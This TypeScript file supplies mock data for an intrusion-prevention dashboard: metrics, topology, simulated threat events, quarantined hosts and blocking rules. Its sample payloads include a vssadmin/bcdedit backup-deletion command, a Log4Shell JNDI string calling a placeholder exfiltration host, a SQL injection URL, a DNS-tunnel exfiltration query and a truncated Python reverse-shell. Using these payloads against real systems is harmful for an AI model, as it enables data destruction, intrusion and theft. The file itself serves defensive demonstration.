import { MetricTelemetry, PreventionRule, QuarantinedHost, ThreatEvent, TopologyNode } from '../types/cyber';

export const initialMetrics: MetricTelemetry = {
  eventsPerSec: 155,
  threatsPrevented: 1285,
  hostQuarantines: 18,
  engineHealth: 98.4,
  globalThreatStatus: 'MODERATE',

  // NIPS
  nipsThroughput: 45200,
  nipsPacketDrops: 1240,
  nipsActiveRules: 3,

  // HIPS
  hipsMonitoredPids: 312,
  hipsSystemCallsSecured: true,
  hipsIsolatedPids: 2,

  // WIPS
  wipsMonitoredAps: 24,
  wipsRogueAps: 2,
  wipsDeauthMitigation: true,

  // NBA
  nbaBaselineDev: 1.2,
  nbaAnomalyScore: 24,
  nbaDnsTunnelShield: true,

  // AI Proxy Layer
  aiProxyDpiInspectedCount: 148290,
  aiProxyZeroDayIntercepts: 43,
  aiProxyAverageHeuristicScore: 18.5,
  aiProxyDynamicTrafficShapingRate: 485.6, // Mbps
};

export const topologyNodes: TopologyNode[] = [
  {
    id: 'WAN',
    name: 'INTERNET / WAN',
    layer: 'External Boundary (Edge)',
    badge: 'UNTRUSTED',
    type: 'WAN',
    description: 'Inbound packet streams from global transit networks and public peering links.',
    subItems: [
      'Raw incoming packet ingress (BGP / Transit)',
      'Global Threat Feeds & Botnet telemetry',
      'Volumetric DDoS & flood vectors entrypoint'
    ],
    status: 'ACTIVE',
    packetsHandled: 1845200,
    threatsDetected: 4120
  },
  {
    id: 'FIREWALL',
    name: 'Hardware Firewall',
    layer: 'Perimeter L3/L4 Filter',
    badge: 'STATEFUL L3/L4',
    type: 'FIREWALL',
    description: 'Filtering Layer 3/4: Blokir port & IP blacklist statis.',
    subItems: [
      'Layer 3 IP Blacklist & CIDR Geoblocking',
      'Layer 4 TCP/UDP Port Enforcement (Blocks telnet, RPC, SMB)',
      'SYN Cookie Flood & ICMP Flood Absorption'
    ],
    status: 'ACTIVE',
    packetsHandled: 1520100,
    threatsDetected: 1835
  },
  {
    id: 'AI_PROXY',
    name: 'AI INTELLIGENCE PROXY / LAYER',
    layer: 'Core Inspection Layer (Posisi Baru)',
    badge: 'AI DPI & ML ENGINE',
    type: 'AI_PROXY',
    description: 'Posisi Baru: Deep Packet Inspection, Heuristic Scoring, ML Zero-Day Prediction, and Dynamic Traffic Shaping.',
    subItems: [
      'Deep Packet Inspection (DPI) & Heuristic Scoring (0-100)',
      'Zero-Day Threat Prediction (Real-time ML Model inference)',
      'Dynamic Traffic Shaping & Smart Routing (Clean vs Anomaly)'
    ],
    status: 'ACTIVE',
    packetsHandled: 984500,
    threatsDetected: 1285
  },
  {
    id: 'IPS_CLUSTER',
    name: 'Modul IPS Cluster (NIPS, HIPS, WIPS, NBA)',
    layer: 'Specialized Defense Enclaves',
    badge: 'INLINE / AGENT / SENSOR',
    type: 'IPS_CLUSTER',
    description: 'Menerima Trafik Bersih/Dinormalisasi untuk inspeksi mendalam tingkat aplikasi, host, wireless, dan perilaku.',
    subItems: [
      'NIPS: Inline payload regex, exploit signature drop',
      'HIPS: Agent syscall monitor, memory integrity, PID quarantine',
      'WIPS: RF 802.11 spectrum scanner, deauth defense, rogue AP hunter',
      'NBA: Anomaly heuristic baseline, DNS tunnel shield, user behavior'
    ],
    status: 'ACTIVE',
    packetsHandled: 842100,
    threatsDetected: 980
  },
  {
    id: 'QUARANTINE',
    name: 'Automated Quarantine / Block',
    layer: 'Automated Isolation Enclave',
    badge: 'ZERO-TRUST SANDBOX',
    type: 'QUARANTINE',
    description: 'Menerima Trafik Anomali / Serangan hasil filtering AI Proxy untuk isolasi otomatis dan investigasi forensik.',
    subItems: [
      'Automated Host & Endpoint Network Isolation',
      'Malicious Session RST & TCP Stream Poisoning',
      'PCAP Payload Forensic Storage & Honeypot Redirection'
    ],
    status: 'ACTIVE',
    packetsHandled: 142400,
    threatsDetected: 1285
  }
];

export const initialThreatFeed: ThreatEvent[] = [
  {
    id: 'EVT-9042',
    timestamp: '11:39:26',
    module: 'NIPS',
    title: 'SYN Flood Volumetric Surge Dropped Inline',
    attackType: 'TCP SYN Flood DDoS (Layer 4/7)',
    sourceIp: '185.220.101.5',
    targetIp: '10.0.1.45',
    port: 443,
    payload: '[0x45 0x00 0x00 0x3c 0x1c 0x46 0x40 0x00 0x40 0x06 SYN=1 ACK=0 WIN=1024]',
    severity: 'CRITICAL',
    status: 'DROPPED',
    heuristicScore: 94,
    zeroDayProb: 12,
    aiVerdict: 'DDoS packet burst exceeded threshold (48,000 pps). Dropped by NIPS inline burst filter.',
    actionTaken: 'INLINE_DROP & SYN_COOKIE'
  },
  {
    id: 'EVT-9041',
    timestamp: '11:39:21',
    module: 'HIPS',
    title: 'Suspicious Shadow Copy Deletion (Vssadmin)',
    attackType: 'Ransomware Pre-Encryption Vector',
    sourceIp: '192.168.10.84',
    targetIp: '10.0.2.12',
    payload: 'cmd.exe /c "vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default} recoveryenabled No"',
    severity: 'CRITICAL',
    status: 'QUARANTINED',
    heuristicScore: 98,
    zeroDayProb: 88,
    aiVerdict: 'Host endpoint process spawned ransomware signature destroying shadow backup volumes. Endpoint PID 4920 severed from internal LAN.',
    actionTaken: 'HOST_QUARANTINE_ISOLATE'
  },
  {
    id: 'EVT-9040',
    timestamp: '11:39:15',
    module: 'WIPS',
    title: 'Evil Twin Rogue AP Detected with Target SSID',
    attackType: 'Wireless Rogue AP Spoofing (802.11 Beacon)',
    sourceIp: 'B4:82:C5:11:A2:3F',
    targetIp: 'WIFI-CORP-GUEST',
    payload: '802.11 Beacon frame spoofing ESSID "Corp_Secure_WPA3" with WPA2-PSK downgrade',
    severity: 'HIGH',
    status: 'BLOCKED',
    heuristicScore: 89,
    zeroDayProb: 5,
    aiVerdict: 'WIPS RF sensor triangulated unauthorized transmitter in 2.4GHz spectrum. Continuous deauthentication frames emitted to sever connected victims.',
    actionTaken: 'DEAUTH_MITIGATION_ACTIVE'
  },
  {
    id: 'EVT-9039',
    timestamp: '11:39:08',
    module: 'NBA',
    title: 'Base64 Encoded DNS Tunnel Exfiltration',
    attackType: 'DNS Tunneling C2 Channel',
    sourceIp: '192.168.10.155',
    targetIp: '8.8.8.8',
    port: 53,
    payload: 'aW5mb3NlYy1leGZpbHRyYXRpb24tcGF5bG9hZC0wMDE.c2-beacon.ns1.darkvector.cc',
    severity: 'HIGH',
    status: 'MITIGATED',
    heuristicScore: 87,
    zeroDayProb: 76,
    aiVerdict: 'Entropy of DNS query TXT/A subdomains exceeds baseline by 4.2 std deviations. NBA behavioral shield sinkholed query.',
    actionTaken: 'DNS_SINKHOLE_APPLIED'
  },
  {
    id: 'EVT-9038',
    timestamp: '11:38:52',
    module: 'AI_PROXY',
    title: 'Zero-Day Polymorphic Deserialization RCE',
    attackType: 'AI Proxy Zero-Day Prediction',
    sourceIp: '45.154.255.88',
    targetIp: '10.0.1.80',
    port: 8080,
    payload: '${jndi:ldap://exfil.darkhacker.org/a} - Encoded polymorphic binary blob in HTTP User-Agent',
    severity: 'CRITICAL',
    status: 'QUARANTINED',
    heuristicScore: 96,
    zeroDayProb: 94,
    aiVerdict: 'Deep Packet Inspection detected unindexed bytecode pattern attempting JVM memory injection. AI Intelligence Proxy diverted packet straight to Automated Quarantine Enclave.',
    actionTaken: 'AI_PROXY_ROUTED_TO_QUARANTINE'
  },
  {
    id: 'EVT-9037',
    timestamp: '11:38:30',
    module: 'NIPS',
    title: 'SQL Injection Union-Based Extraction Blocked',
    attackType: 'Web Exploitation (OWASP Top 10)',
    sourceIp: '103.245.12.9',
    targetIp: '10.0.1.20',
    port: 80,
    payload: 'GET /api/v1/auth?user=admin%27+UNION+SELECT+1,version(),table_name+FROM+information_schema.tables--',
    severity: 'MODERATE',
    status: 'DROPPED',
    heuristicScore: 78,
    zeroDayProb: 15,
    aiVerdict: 'Inline NIPS rule #102 triggered. Malicious SQL token combination terminated at HTTP protocol boundary.',
    actionTaken: 'INLINE_PAYLOAD_DROP'
  }
];

export const initialQuarantinedHosts: QuarantinedHost[] = [
  {
    id: 'Q-01',
    hostname: 'FIN-WKS-084',
    ip: '192.168.10.84',
    mac: '00:1A:2B:3C:4D:5E',
    pid: 4920,
    processName: 'vssadmin.exe / svchost_fake.exe',
    isolatedAt: '11:39:21',
    reason: 'HIPS Ransomware Shadow Volume Purge Attempt',
    sourceModule: 'HIPS',
    threatScore: 98,
    status: 'ISOLATED'
  },
  {
    id: 'Q-02',
    hostname: 'DEV-SRV-BUILD02',
    ip: '10.0.2.110',
    mac: '52:54:00:AB:CD:EF',
    pid: 8812,
    processName: 'python3 -c "import socket,subprocess,os;..."',
    isolatedAt: '11:22:15',
    reason: 'AI Proxy DPI Zero-Day Remote Reverse Shell',
    sourceModule: 'AI_PROXY',
    threatScore: 95,
    status: 'SANDBOXED'
  },
  {
    id: 'Q-03',
    hostname: 'HR-LAPTOP-22',
    ip: '192.168.10.155',
    mac: 'A4:83:E7:2B:90:12',
    pid: 1404,
    processName: 'nslookup_loop.vbs',
    isolatedAt: '11:39:08',
    reason: 'NBA DNS Tunneling High Entropy Data Exfiltration',
    sourceModule: 'NBA',
    threatScore: 87,
    status: 'ISOLATED'
  },
  {
    id: 'Q-04',
    hostname: 'MKT-DESK-19',
    ip: '192.168.20.19',
    mac: '70:85:C2:5F:AA:11',
    pid: 3204,
    processName: 'mimikatz.exe',
    isolatedAt: '10:45:10',
    reason: 'HIPS LSASS Memory Scraping Injection',
    sourceModule: 'HIPS',
    threatScore: 99,
    status: 'ISOLATED'
  },
  {
    id: 'Q-05',
    hostname: 'EXT-CONTRACTOR-01',
    ip: '192.168.30.5',
    mac: '3C:06:30:4A:88:99',
    isolatedAt: '10:12:44',
    reason: 'Hardware Firewall Blacklisted Static IP Infiltration',
    sourceModule: 'NIPS',
    threatScore: 82,
    status: 'ISOLATED'
  }
];

export const initialPreventionRules: PreventionRule[] = [
  {
    id: 'RULE-101',
    code: 'NIPS-DDoS-SURGE-01',
    name: 'Volumetric Ingress Threshold Suppression',
    module: 'NIPS',
    description: 'Inline drop for raw packets exceeding 40k pps from single subnet or unverified ASN.',
    action: 'DROP_INLINE',
    severity: 'CRITICAL',
    enabled: true,
    matchCount: 1240
  },
  {
    id: 'RULE-102',
    code: 'HIPS-VSS-KILL-02',
    name: 'Shadow Volume Deletion Terminator',
    module: 'HIPS',
    description: 'Intercepts vssadmin, bcdedit, and wbadmin calls; immediately isolates PID and endpoint.',
    action: 'QUARANTINE_HOST',
    severity: 'CRITICAL',
    enabled: true,
    matchCount: 18
  },
  {
    id: 'RULE-103',
    code: 'WIPS-ROGUE-DEAUTH-03',
    name: 'Evil Twin Beacon Invalidation & Jam Mitigation',
    module: 'WIPS',
    description: 'Detects unauthorized BSSID spoofing enterprise SSID and emits continuous 802.11 deauth signals.',
    action: 'DEAUTH_AP',
    severity: 'HIGH',
    enabled: true,
    matchCount: 2
  },
  {
    id: 'RULE-104',
    code: 'NBA-DNS-TUNNEL-04',
    name: 'Subdomain Entropy Exfiltration Shield',
    module: 'NBA',
    description: 'Flags and sinkholes DNS queries with Shannon entropy > 4.5 and TXT record payload tunneling.',
    action: 'RESET_CONNECTION',
    severity: 'HIGH',
    enabled: true,
    matchCount: 45
  },
  {
    id: 'RULE-105',
    code: 'AI-DPI-HEURISTIC-05',
    name: 'AI Intelligence Proxy Zero-Day Smart Diverter',
    module: 'AI_PROXY',
    description: 'Heuristic deep packet inspection: packets with ML Risk > 85% diverted straight to Automated Quarantine.',
    action: 'AI_SANDBOX',
    severity: 'CRITICAL',
    enabled: true,
    matchCount: 43
  },
  {
    id: 'RULE-106',
    code: 'NIPS-SQLI-OWASP-06',
    name: 'SQL Injection Multi-Token Tokenizer Drop',
    module: 'NIPS',
    description: 'Filters URI, headers, and form bodies for UNION SELECT, xp_cmdshell, or stacked queries.',
    action: 'DROP_INLINE',
    severity: 'MODERATE',
    enabled: true,
    matchCount: 312
  }
];

export const simulationPresets = [
  {
    id: 'nips-ddos',
    label: 'Trigger NIPS DDoS',
    module: 'NIPS' as const,
    color: '#f43f5e',
    borderColor: 'border-rose-500/60',
    hoverBg: 'hover:bg-rose-500/20',
    activeGlow: 'glow-rose',
    textColor: 'text-rose-400',
    title: 'Volumetric SYN & UDP Amplification Burst',
    description: 'Simulates 45.2k pps flood targeting port 443 web gateway. NIPS inline engine triggers automatic packet drop.',
    heuristicScore: 95,
    zeroDayProb: 14,
    trafficSpike: 180,
    threatSpike: 140
  },
  {
    id: 'hips-ransomware',
    label: 'Trigger HIPS Ransomware',
    module: 'HIPS' as const,
    color: '#f97316',
    borderColor: 'border-amber-500/60',
    hoverBg: 'hover:bg-amber-500/20',
    activeGlow: 'glow-amber',
    textColor: 'text-amber-400',
    title: 'Ransomware Kernel Syscall & Vssadmin Attack',
    description: 'Simulates endpoint malware deleting shadow copies and encrypting MFT. HIPS agent terminates PID and quarantines host.',
    heuristicScore: 99,
    zeroDayProb: 86,
    trafficSpike: 25,
    threatSpike: 80
  },
  {
    id: 'wips-rogue',
    label: 'Trigger WIPS Rogue AP',
    module: 'WIPS' as const,
    color: '#eab308',
    borderColor: 'border-yellow-500/60',
    hoverBg: 'hover:bg-yellow-500/20',
    activeGlow: 'glow-yellow',
    textColor: 'text-yellow-400',
    title: 'Evil-Twin Wi-Fi BSSID Spoofing Vector',
    description: 'Broadcasts fake corporate beacon frames on 2.4GHz. WIPS RF sensor tracks signal RSSI and engages 802.11 deauthentication.',
    heuristicScore: 88,
    zeroDayProb: 8,
    trafficSpike: 15,
    threatSpike: 45
  },
  {
    id: 'nba-dns',
    label: 'Trigger NBA DNS Tunnel',
    module: 'NBA' as const,
    color: '#a855f7',
    borderColor: 'border-purple-500/60',
    hoverBg: 'hover:bg-purple-500/20',
    activeGlow: 'glow-purple',
    textColor: 'text-purple-400',
    title: 'High-Entropy DNS Exfiltration C2 Beacon',
    description: 'Transmits encoded corporate database chunks via base64 TXT DNS queries. NBA behavioral baseline anomaly triggers sinkhole.',
    heuristicScore: 92,
    zeroDayProb: 72,
    trafficSpike: 40,
    threatSpike: 95
  },
  {
    id: 'ai-zeroday',
    label: 'Simulate Zero-Day Exploit (AI Proxy DPI)',
    module: 'AI_PROXY' as const,
    color: '#06b6d4',
    borderColor: 'border-cyan-500/60',
    hoverBg: 'hover:bg-cyan-500/20',
    activeGlow: 'glow-cyan',
    textColor: 'text-cyan-400',
    title: 'Polymorphic In-Memory Shellcode (Zero-Day)',
    description: 'Bypasses hardware firewall L3/L4 rules. AI Intelligence Proxy DPI model detects payload entropy, instantly diverting to Quarantine.',
    heuristicScore: 97,
    zeroDayProb: 98,
    trafficSpike: 65,
    threatSpike: 110
  }
];
